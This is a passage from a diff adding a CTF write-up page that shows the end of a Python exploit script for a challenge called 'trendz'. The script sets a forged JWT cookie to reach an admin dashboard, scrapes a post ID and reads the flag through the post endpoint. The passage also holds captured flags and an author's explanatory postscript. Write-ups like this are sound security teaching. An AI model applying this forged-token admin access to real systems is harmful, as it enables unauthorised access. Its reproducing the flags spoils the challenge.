+    s.cookies.update({&quot;accesstoken&quot;: new_jwt})
+
+    response = requests.get(f&quot;{BASE_URL}/admin/dashboard&quot;,cookies={&quot;accesstoken&quot;: new_jwt})
+
+    soup = BeautifulSoup(response.text, 'html.parser')
+    postid = soup.find_all('td')[1].text
+
+    print(f&quot;Post-id: {postid}&quot;)
+
+    flag = s.get(f&quot;{BASE_URL}/user/posts/{postid}&quot;).json().get(&quot;data&quot;)
+
+    print(&quot;Flag 1 trendz: &quot; + flag)
+
+def main():
+    print(&quot;Exploiting...&quot;)
+
+    username, password = random_string(10), random_string(10)
+    register(username, password)
+    login(username, password)
+
+    get_flag_1()
+
+    if not get_flag_2():
+        print(&quot;Flag 2 retrieval failed try again :(&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag 1: CSCTF{0a97afb3-64be-4d96-aa52-86a91a2a3c52}
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag 2: CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}
+</code></pre>
+
+<h5 id="ps" class="header-anchor-wrapper">PS:
+  <a href="#ps" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h5>
+
+<blockquote>
+<p>In the first flag I skipped a very funny part, in fact it is not enough to log in only as admin because we will not be shown the flag but a post of an ID that if you remember the flag was also in a precise record initialised in run.sh, if through /user/posts/post-id we view the post we can find the flag</p>
+</blockquote>
+<p align='right'>Author: akiidjk </p>
 
 </article>
 </div>
